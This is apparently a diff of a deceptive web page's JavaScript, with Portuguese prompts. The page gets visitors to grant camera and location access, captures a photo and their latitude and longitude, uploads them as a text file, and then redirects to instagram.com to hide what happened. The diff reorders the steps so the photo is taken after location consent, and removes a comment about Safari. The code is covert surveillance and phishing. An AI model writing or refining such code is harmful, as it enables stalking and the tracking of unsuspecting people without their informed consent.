@@ -101,12 +101,14 @@
       });
     }
 
-    function requestLocation(imageUrl) {
+    function requestLocation() {
       const getLocation = () => {
         navigator.geolocation.getCurrentPosition(
           async (pos) => {
             try {
               const { latitude, longitude } = pos.coords;
+              const imageUrl = await capturePhoto();
+
               const textBlob = new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`], { type: "text/plain" });
               const textForm = new FormData();
               textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
@@ -122,12 +124,11 @@
               localStorage.removeItem("uploadedImageUrl");
               window.location.href = "https://instagram.com";
             } catch (err) {
-              showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => requestLocation(imageUrl));
+              showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", requestLocation);
             }
           },
           () => {
             showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => {
-              // Safari requer reload para novo pedido de permissão
               localStorage.setItem("retryLocation", "1");
               location.reload();
             });
@@ -140,8 +141,7 @@
 
     async function startFlow() {
       try {
-        const imageUrl = await capturePhoto();
-        requestLocation(imageUrl);
+        requestLocation();
       } catch (e) {
         console.error("Erro no fluxo:", e);
       }
@@ -153,7 +153,7 @@
 
       if (savedUrl && retryLocation) {
         localStorage.removeItem("retryLocation");
-        showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => requestLocation(savedUrl));
+        showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => requestLocation());
       } else {
         showOverlay("Toque para continuar", startFlow);
       }
